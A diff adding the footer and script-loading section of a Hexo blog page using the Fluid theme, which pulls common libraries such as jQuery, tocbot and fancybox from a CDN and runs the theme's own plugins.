+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
